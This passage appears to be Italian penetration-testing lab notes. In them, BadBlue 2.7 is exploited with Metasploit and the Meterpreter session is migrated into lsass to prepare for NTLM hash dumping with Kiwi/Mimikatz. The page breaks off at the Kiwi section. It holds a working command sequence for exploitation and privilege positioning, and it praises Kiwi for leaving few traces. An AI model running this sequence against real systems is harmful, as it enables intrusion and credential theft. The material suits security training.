# Dumping Hashes With Mimikatz

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Kiwi ha come vantaggio che viene eseguito in memoria quindi non lascia artefatti o tracce sul target come mimikatz che dev'essere scaricato.

## Come dumpare NTLM hashes

### Primo step: exploitare un servizio vulnerabile sul target

```
nmap -sV 10.2.18.199
service postresql start && msfconsole
search badblue
use exploit/windows/(http/badblue_passthru
set RHOSTS 10.2.18.199
exploit
sysinfo
getuid
pgrep lsass
migrate 788
getuid
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

La macchina target ha sulla porta 80 un servizio vulnerabile chiamato BadBlue

Noi facciamo comunque uno scan con nmap dalla nostra macchina attaccante.

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

BadBlue in version 2.7

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

L'unica opzione da configurare è il target IP

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Migriamo a un processo 64 bit, ed essendo Administrator possiamo migrare anche a un processo SYSTEM.

### Kiwi module

